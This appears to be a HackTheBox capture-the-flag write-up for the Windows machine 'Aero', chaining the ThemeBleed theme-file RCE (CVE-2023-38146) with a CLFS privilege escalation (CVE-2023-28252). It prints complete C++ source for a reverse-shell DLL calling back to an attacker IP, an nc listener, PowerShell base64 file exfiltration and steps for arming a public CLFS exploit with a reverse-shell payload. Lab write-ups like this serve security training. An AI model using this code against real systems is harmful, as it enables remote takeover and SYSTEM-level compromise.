# :globe_with_meridians: Aero HTB | Windows 11 RCE & PrivESC | Themebleed | CLFS

---

# Aero HTB | Windows 11 RCE & PrivESC | Themebleed | CLFS

*28/09/2023*

Aero is a Windows machine of moderate difficulty, featuring two recently discovered vulnerabilities: CVE-2023–38146, a Windows 11 Themes Remote Code Execution Vulnerability discovered on September 12, 2023, and CVE-2023–28252, a Windows Common Log File System Driver Elevation of Privilege Vulnerability discovered on April 11, 2023. Access to the system is initially gained by skillfully crafting a malicious payload using the ThemeBleed proof-of-concept.

## Enumeraton:

>

nmap -sVC -p- — min-rate 1000 10.10.11.237

The HTTP server header shows that the webserver is IIS version 10.

Looking at the results of the Nmap scan, only one port is open: 80. Let’s browse port 80:

navigate to the /upload page

I attempted to upload a basic image file, but it failed because only files with the extensions ‘.theme’ and ‘.themepack’ are permitted.

*allowed extensions*

I attempted to upload a dummy file named ‘aero.theme,’ and the upload was successful.”

Also X-Powered-By header is ARR/3.0. Application Request Routing (ARR) is an extension to IIS, which enables an IIS server to function as a load balancer. With ARR, an IIS server can be configured to route incoming requests to one of multiple web servers using one of several routing algorithms.

*ARR extension*

Let’s perform directory fuzzing using Gobuster to discover any directories.

nothing fancy.

According to the challenge description, this machine is related to “ThemeBleed."

The ThemeBleed vulnerability was listed as [CVE-2023–38146](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38146): a Windows Themes Remote Code Execution (RCE) vulnerability. Microsoft [assigned](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2023-38146) a CVSS score of 8.8 (out of 10) and gave it a severity rating “Important”, saying:

>

*“An attacker would need to convince a targeted user to load a Windows Themes file on a vulnerable system with access to an attacker-controlled SMB share.”*

The ThemeBleed exploit is based on a race condition that can be triggered by opening a specially crafted* .theme* file. A race condition, or race hazard, is the behavior of a system where the output depends on the sequence or timing of other uncontrollable events. It becomes a bug when events do not happen in the order the programmer intended.

The *.theme* files contain references to *.msstyles*files, which should contain no code, only graphical resources that are loaded when the theme file invoking them is opened. When the .theme file is opened, the .*msstyles* file will also be loaded.

The researcher found that invoking a check of the theme version calls the *ReviseVersionIfNecessary* function and does not safely load a signed DLL (*_vrf.dll*), because the DLL is closed after verifying the signature, and then re-opened when the DLL is loaded via a call to LoadLibrary. During that interval the file could be replaced by a malicious version. ([https://www.malwarebytes.com/blog/news/2023/09/themebleed-exploit-is-another-reason-to-patch-windows-quickly](https://www.malwarebytes.com/blog/news/2023/09/themebleed-exploit-is-another-reason-to-patch-windows-quickly))

## POC:

Let’s download the compiled executable from the following github repositiry:

[https://github.com/gabe-k/themebleed](https://github.com/gabe-k/themebleed)

Identify file types and architectures in a directory.

According to Gabe Kirkpatrick’s GitHub, the binaries in the “data” directory correspond to the three files that were sent to the target as part of the Proof of Concept.

- `stage_1` - An `msstyles` file with the `PACKTHEM_VERSION` set to 999.

- `stage_2` - A valid unmodified `msstyles` file to pass the signature check.

- `stage_3` - The DLL that will be loaded and executed. The provided example simply launches `calc.exe`. According to the instructions, to make our own payload, we should create a DLL with an export named `VerifyThemeVersion` containing our code, and replace `stage_3` with our newly created DLL.

So, let’s Generate a malicious DLL:

1. Open Visual Studio.
2. Click on “Create a new project.”
3. In the search box, type “DLL.”
4. Select the “Dynamic-Link Library (DLL)” Windows C++ Library.

First, create a test DLL that displays a popup message. Right-click on ‘Source Files’ in the Solution Explorer window, then click ‘Add’ and select ‘New Item.’ Choose ‘C++ File’ and name the file ‘rev.cpp’.

Right-click on ‘Header Files’ in the Solution Explorer window, then click ‘Add’ and select ‘New Item.’ Choose ‘Header File (.h)’ and name the file ‘rev.h’.

Inside the Header file we add the following lines of code, defining the exported function VerifyThemeVersion required by the PoC:

*rev.h*

>

This code declares the function `VerifyThemeVersion` with the `__declspec(dllexport)` attribute to indicate that it should be exported from the DLL.

```
#pragma once

extern "C" __declspec(dllexport) int VerifyThemeVersion(void);
```

The following code will display a popup message:

```
#include "pch.h" // This line includes the precompiled header file "pch.h" if available.
#include <stdio.h> // Includes the standard input-output library.
#include <string.h> // Includes the string handling library.
#include <winsock2.h> // Includes the Windows Socket 2 API.
#include <rev.h> // Includes the custom header file "rev.h".

using namespace std; // This line declares the usage of the "std" namespace.

int VerifyThemeVersion(void) // This line defines a function named "VerifyThemeVersion" that takes no parameters ("void").
{
MessageBox(NULL, L"TEST THEME BLEED!", L"dialogue", MB_OK); // This line calls the "MessageBox" function to display a message box with the text "TEST THEME BLEED!" and a title "dialogue" when this function is called. The "MB_OK" flag indicates an OK button in the message box.

return 0; // This line returns an integer value of 0 from the function.
}
```

Let’s Build the solution:

When running it with rundll32, it shows a popup message that we coded.

We now can create a Reverse Shell using this [template](https://github.com/tudorthe1ntruder/reverse-shell-poc/blob/master/rs.c) but it needs some modifications:

## Reverse shell (rev.cpp)

```
#include "pch.h"
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#include "rev.h"
using namespace std;

void rev_shell()
{
FreeConsole();

const char* REMOTE_ADDR = "10.10.14.150";
const char* REMOTE_PORT = "1234";

WSADATA wsaData;
int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
struct addrinfo* result = NULL, * ptr = NULL, hints;
memset(&hints, 0, sizeof(hints));
hints.ai_family = AF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_protocol = IPPROTO_TCP;
getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
ptr = result;
SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
STARTUPINFO si;
PROCESS_INFORMATION pi;
ZeroMemory(&si, sizeof(si));
si.cb = sizeof(si);
ZeroMemory(&pi, sizeof(pi));
si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;
si.hStdInput = (HANDLE)ConnectSocket;
si.hStdOutput = (HANDLE)ConnectSocket;
si.hStdError = (HANDLE)ConnectSocket;
TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
WSACleanup();
}

int VerifyThemeVersion(void)
{
rev_shell();
return 0;
}
```

When we execute the above code, it initiates a reverse shell connection back to our server on port 1234, enabling remote control and the execution of commands on the target system. We should now set the solution configuration to “Release (x64)” and build the solution.

According to Gabe Kirkpatrick’s GitHub repository, we should copy the compiled DLL payload into the ThemeBleed repository under the “data/stage3” directory.

```
PS> copy I:\Aero\ThemeBleeed\x64\Release\ThemeBleeed.dll .\stage_3
```

*Overwrite the ‘stage_3’ file with the new DLL*

Generate a .theme file using ThemeBleed.exe.

## Get Aydin Naserifard’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

when we start the ThemeBleed server, it fails:

```
.\ThemeBleed.exe make_theme 10.10.14.150 aero.theme
```

*start the server*

The issue is that Windows is already listening on SMB by default. so we must stop the “Server” service in the Windows Services panel:

*stopping the service*

When we start the server, it fails again. To resolve the problem, we should disable the “Server” service and reboot our machine.”

Following the reboot, I can successfully run the exploit in Server mode:

*start the ThemBleed server*

Now, start “nc -lnvp 1234” on our local machine, then upload the malicious ‘aero.theme’ package that we created.

```
C:\Users\Administrator\Desktop\ThemeBleed>.\ThemeBleed.exe server
Server started
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary
```

There are connections to the ThemeBleed server. when the client requests stage 3 to “loadlibrary”, We obtain a shell as “sam.emerson”

*user flag*

When we enumerate the target machine, there are two files in ‘sam.emerson’s Documents directory.

*systeminfonet usersprivenumerate*

let’s see watchdog.ps1

It is designed to monitor a specified directory for the creation of new theme files with “.theme” and “.themepack” extensions and perform actions when such files are created.

*whatchdog.ps1*

let’s exfiltrate CVE-2023–28252_Summary.pdf using powershell and converts it into a Base64-encoded string:

```
PS C:\Users\sam.emerson\Documents> [convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
```

*exfiltrate*

decode it:

```
PS:/> [System.IO.File]::WriteAllBytes("C:\Users\..\Desktop\CVE-2023-28252_Summary.pdf" , [System.Convert]::FromBase64String("Base64 encoded string"))
```

*decode*

When we open the pdf, it has information about CVE-2023–28252.

## Privilege Escalation (CVE-2023-28252)

Let’s use [Fortra repository](https://github.com/fortra/CVE-2023-28252) to exploit this CVE. We should edit the code to exploit Common Log File System. First, Open it in Visual Studio and modify the last part of the code. By default, the code executes ‘notepad.exe’. To obtain a reverse shell, replace ‘notepad.exe’ with the base64 payload from PowerShell#3 (base64) on the [RevShells](https://www.revshells.com/) website. Next, set the solution configuration to ‘Release (x64)’ and build the solution.

*default exploit code*

*PowerShell payload*

*edited exploit code*

>

When I build the solution, I encountered many errors. To address this issue, right-click on ‘clfs_eop’ in the Solution Explorer, go to Properties -> Configuration Properties -> Advanced, and set the Character Set from ‘Not Set’ to ‘Use Multi-Byte Character Set’.

*build the solution*

*to fix errors*

*to fix errors*

Now, Re-build the solution.

*build the solution*

It’s time to upload the compiled executable to the target. Let’s start a Python webserver.

*python webserver*

Then download and save the file:

*download the clfs_eop.exe*

Finally, start another nc listener and execute the program.

*execute the programnc*

Now, we have a shell as NT Authority\System.

*root flag*

---
